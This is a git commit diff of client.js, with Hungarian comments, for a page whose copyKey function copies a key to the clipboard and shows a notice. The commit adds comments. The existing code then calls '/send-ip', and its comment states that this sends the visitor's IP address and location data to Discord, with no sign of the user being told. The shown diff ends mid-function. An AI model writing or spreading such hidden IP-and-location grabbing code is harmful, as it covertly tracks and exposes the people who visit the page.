3f0cffcc7c44d66276f610ed1ddb0bbb3662719b
Szaby <szaby.korodi@yahoo.com>
2025-07-31 16:32:52 +0300

    Update client.js

--- client.js
+++ client.js
@@ -1,17 +1,21 @@
 // Kulcs másolása a vágólapra
 function copyKey() {
+    // Kulcs elemének kiválasztása
     const keyElement = document.getElementById("key");
     keyElement.select();
     keyElement.setSelectionRange(0, 99999); // Mobilon is működik
+
+    // Kulcs másolása a vágólapra
     document.execCommand("copy");
 
+    // Visszajelzés a felhasználónak
     const notification = document.getElementById("notification");
     notification.style.display = "block"; // Megjeleníti az üzenetet
     setTimeout(() => {
         notification.style.display = "none"; // Elrejti 3 másodperc múlva
     }, 3000);
 
-    // Hívjuk a szerveroldali API-t, hogy küldje el az IP-t a Discordra
+    // Hívás a szerverhez, hogy küldje el az IP-t és helyadatokat a Discordra
     fetch('/send-ip')
         .then(response => response.text())
         .then(data => {
